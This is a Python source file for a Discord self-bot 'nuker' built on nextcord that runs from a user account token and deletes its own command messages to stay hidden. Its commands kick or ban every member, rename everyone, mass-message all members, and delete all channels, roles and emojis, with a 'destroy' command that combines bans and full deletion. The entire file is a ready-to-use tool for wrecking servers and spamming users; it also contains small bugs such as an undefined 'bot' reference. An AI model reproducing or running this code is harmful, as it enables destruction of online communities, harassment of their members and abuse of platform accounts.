token = "" # refer to main branch
prefix = "~" 

import nextcord
from nextcord.ext import commands

print ("Loading..")

intents = nextcord.Intents.all()
client = commands.Bot(command_prefix=prefix, intents=intents, help_command=None, self_bot=True)
# Construct an instance of commands.Bot

@client.event
async def on_command_error(ctx, error):
    pass

@bot.check
async def command_invoke_delete(ctx):
    try:
        await ctx.message.delete()
    except nextcord.Forbidden:
        # lol this should never happen
        pass
    finally:
        return True

@client.event
async def on_ready():
    print("Ready to be innocent.")

@client.command()
async def kall(ctx):
    for member in ctx.guild.members:

        if member == client.user:
            continue

        try:
            await member.kick()
        except nextcord.Forbidden:
            print(f"{member.name} has FAILED to be kicked from {ctx.guild.name}")
        else:
            print(f"{member.name} has been kicked from {ctx.guild.name}")

    print("Action Completed: kall")

@client.command()
async def ball(ctx):
    for member in ctx.guild.members:
        
        if member == client.user:
            continue

        try:
            await member.ban()
        except nextcord.Forbidden:
            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
        else:
            print(f"{member.name} has been kicked from {ctx.guild.name}")
    
    print("Action Completed: ball")  

@client.command()
async def rall(ctx, *, nick):
    for member in ctx.guild.members:
            
        try:
            await member.edit(nick=nick)
        except nextcord.Forbidden:
            print(f"{member.name} has NOT been renamed to {nick} in {ctx.guild.name}")
        else:
            print(f"{member.name} has been renamed to {nick} in {ctx.guild.name}")
            
    print("Action Completed: rall")

@client.command()
async def mall(ctx, *, message):
    for member in ctx.guild.members:
        
        if member == client.user:
            continue
            
        try:
            await member.send(message)
        except nextcord.Forbidden:
            print(f"{member.name} has NOT recieved the message.")
        else:
            print(f"{member.name} has recieved the message.")
            
    print("Action Completed: mall")

@client.group(invoke_without_command=True, case_insensitive=True)
async def dall(ctx):
    print(f'Choose an option from -> {", ".join([c.name for c in ctx.command.commands])}')
    
@dall.command()
async def channels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except nextcord.Forbidden:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        except nextcord.HTTPException:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{channel.name} has been deleted in {ctx.guild.name}")
    print("Action Completed: dall channels")  

@dall.command()
async def roles(ctx):

    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.delete()
        except nextcord.Forbidden:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{role.name} has been deleted in {ctx.guild.name}")
                
    print("Action Completed: dall roles")
  
@dall.command()
async def emojis(ctx):
    
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")
        except nextcord.Forbidden:
            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")
            
    print("Action Completed: dall emojis")

@dall.command()
async def all(ctx):
    # LOL
    print('Deleting all...')
    
    print('Deleting channels..')
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except nextcord.Forbidden:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        except nextcord.HTTPException:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{channel.name} has been deleted in {ctx.guild.name}")
        
    print('Deleting roles..')
    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.delete()
        except nextcord.Forbidden:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{role.name} has been deleted in {ctx.guild.name}")
            
    print('Deleting emojis..')
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except nextcord.Forbidden:
            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")
            
    print("Action Completed: dall all")
   
@client.command()
async def destroy(ctx):

    for member in ctx.guild.members:

        if member == client.user:
            continue

        try:
            await member.ban()
        except nextcord.Forbidden:
            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
        else:
            print(f"{member.name} has been banned from {ctx.guild.name}")

    await all(ctx)

    print("Action Completed: destroy")
try:
    client.run(token, bot=False)
except nextcord.LoginFailure:
    print('Invalid Token Passed')
